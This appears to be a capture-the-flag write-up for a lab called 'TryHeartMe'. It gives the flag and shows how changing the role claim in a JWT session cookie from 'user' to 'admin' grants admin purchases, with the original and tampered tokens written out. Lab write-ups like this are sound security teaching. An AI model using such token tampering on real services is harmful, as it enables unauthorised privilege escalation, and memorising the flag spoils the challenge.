# TryHeartMe

1. What is the flag?
   Ans:`THM{v4l3nt1n3_jwt_c00k13_t4mp3r_4dm1n_sh0p}`

   Visit the website on port 5000 and create an account. Grab the cookie:

   ```jwt
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAbWFpbC5jb20iLCJyb2xlIjoidXNlciIsImNyZWRpdHMiOjAsImlhdCI6MTc3NDE4OTgzNSwidGhlbWUiOiJ2YWxlbnRpbmUifQ.8jW0RYv3x2qD0AqeKIXNfF_x31rsONrb88e3-sv59gY
   ```

   **Decoded JWT**:

   Header

   ```jwt
   {
   "alg": "HS256",
   "typ": "JWT"
   }
   ```

   Payload

   ```jwt
   {
   "email": "test@mail.com",
   "role": "user",
   "credits": 0,
   "iat": 1774189835,
   "theme": "valentine"
   }
   ```

   Modify the role as admin and then save the cookie.

   ```modified jwt
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAbWFpbC5jb20iLCJyb2xlIjoiYWRtaW4iLCJjcmVkaXRzIjowLCJpYXQiOjE3NzQxODk4MzUsInRoZW1lIjoidmFsZW50aW5lIn0.afRL9AcksnVHI7smpJ4xt7AjNjTAadMzfW2BjjFxwVg
   ```

   Buy the special gift and you will have the flag!!!
